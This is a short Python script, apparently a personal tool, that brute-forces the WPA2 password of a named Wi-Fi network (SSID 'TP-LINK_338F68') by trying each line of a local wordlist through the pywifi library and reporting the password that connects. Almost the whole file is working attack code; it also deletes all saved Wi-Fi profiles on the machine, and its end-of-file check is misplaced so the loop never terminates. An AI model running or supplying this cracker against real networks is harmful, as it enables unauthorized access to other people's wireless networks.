#!/usr/bin/env python
# -*- encoding: utf-8 -*-

"""
@author: niuweidong
@software: PyCharm
@file: crackWIFI.py
@time: 2018/04/12 17:00
"""
import time  # 时间
import pywifi  # 破解wifi
from pywifi import const  # 引用一些定义
sleep_time = 1


class PoJie():
    def __init__(self, path,ssid):
        self.file = open(path, "r")
        wifi = pywifi.PyWiFi()  # 抓取网卡接口
        self.iface = wifi.interfaces()[0]  # 抓取第一个无限网卡
        self.iface.disconnect()  # 测试链接断开所有链接
        self.ssid=ssid
        time.sleep(sleep_time)  # 休眠1秒

        # 测试网卡是否属于断开状态，
        assert self.iface.status() in\
            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def readPassWord(self):
        global sleep_time
        print("开始破解：")
        while True:

            try:
                myStr = self.file.readline()
                if len(myStr) < 8:
                    continue
                if not myStr:
                    break
                bool1 = self.test_connect(myStr,self.ssid)
                if bool1:
                    print("密码正确：", myStr)
                    break
                else:
                    print("密码错误:" + myStr)
                time.sleep(sleep_time)
            except BaseException:
                continue

    def test_connect(self, findStr,ssid):  # 测试链接
        global sleep_time
        profile = pywifi.Profile()  # 创建wifi链接文件
        profile.ssid = ssid  # wifi名称
        profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放，
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
        profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
        profile.key = findStr  # 密码

        self.iface.remove_all_network_profiles()  # 删除所有的wifi文件
        tmp_profile = self.iface.add_network_profile(profile)  # 设定新的链接文件
        self.iface.connect(tmp_profile)  # 链接
        time.sleep(sleep_time)
        if self.iface.status() == const.IFACE_CONNECTED:  # 判断是否连接上
            isOK = True
        else:
            isOK = False
        self.iface.disconnect()  # 断开
        time.sleep(1)
        # 检查断开状态
        assert self.iface.status() in\
            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

        return isOK

    def __del__(self):
        self.file.close()


path = r"F:\MyDownloads\Download\wpa2pojiezidian\crackDIct\weak\wordlist.txt"
start = PoJie(path,u'TP-LINK_338F68')
start.readPassWord()

if __name__ == "__main__":
    pass
